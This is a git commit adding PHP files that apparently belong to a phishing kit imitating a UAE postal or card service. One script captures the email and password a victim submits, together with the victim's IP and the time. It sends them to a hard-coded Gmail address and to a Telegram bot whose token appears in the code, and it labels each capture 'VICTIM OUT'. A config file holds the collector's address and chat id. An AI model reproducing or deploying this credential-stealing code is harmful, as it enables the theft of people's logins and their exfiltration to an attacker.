12a022b134248105ea21a5111daed2988853b4b0
liamrossx <120719828+liamrossx@users.noreply.github.com>
2022-12-24 04:11:09 -0800

    Add files via upload

---
+++ Epost/NV6588123/config/n8.php
@@ -0,0 +1,6 @@
+<?php
+$jean_email = "joybaldwin123@gmail.com";
+$chat_id = "1852653652";
+
+
+?>
---
+++ Epost/NV6588123/jean/blanca.php
@@ -0,0 +1,46 @@
+<?php
+include("../config/Sys.php");
+include "../config/n8.php";
+$date = date('m/d/Y h:i:s a', time());
+$ip = getenv("REMOTE_ADDR");
+$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
+if(($_POST['email'] != "") )
+{
+$hostname = gethostbyaddr($ip);
+$message .= "+-------------------+\n";
+$message .= "* SMS : ".$_POST['email']."\n";
+$message .= "* SMS : ".$_POST['password']."\n";
+
+$message .= "* IP   : $ip\n";
+$message .= "* OS   : $user_os\n";
+$message .= "* TIME : $date\n";
+$message .= "* SUM  : $user_browser\n";
+$message .= "+-------------------+\n";
+$send = "$jean_email";
+$subject = "UAE CARD SMS  [".$_POST['jeansms']."]";
+$headers = "From: ".$_POST['jeansms']." <uae@jeann8.com>";
+mail($send,$subject,$message,$headers);
+$token ='2033828112:AAEyRWoh1vAvnGYg_zz8Y53uxwzFLeMDAPQ';
+$data = [
+    'text' => $message,
+    'chat_id' => $chat_id,
+];
+
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+
+
+
+	$infos = "[⚠️] VICTIM OUT";
+	$token ='2033828112:AAEyRWoh1vAvnGYg_zz8Y53uxwzFLeMDAPQ';
+    $data = [
+    'text' => $infos,
+    'chat_id' => $chat_id,
+];
+
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+}
+
+
+header("Location: ../out.php");
+
+?>
